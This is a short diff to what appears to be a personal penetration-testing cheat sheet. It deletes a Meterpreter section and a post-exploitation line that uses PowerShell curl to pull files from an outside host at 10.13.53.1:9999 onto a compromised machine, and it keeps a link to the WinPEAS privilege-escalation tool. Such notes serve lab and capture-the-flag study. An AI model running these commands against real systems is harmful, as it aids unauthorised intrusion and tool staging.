@@ -16,14 +16,6 @@ author_profile: true
 `powershell -c "Command"`  
 `Get-ChildItem -Path . *.txt -Recurse` - search for file (this case .txt)
 
-## Meterpreter
-`load powershell` - loads into meterpreter  
-`powershell_shell`  
-`shell`  
-
-# Post shells
-Uploading files: 
-`powershell -c "curl 10.13.53.1:9999/$file -OutFile $file"`
 
 # Winpeas
 [Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS):  
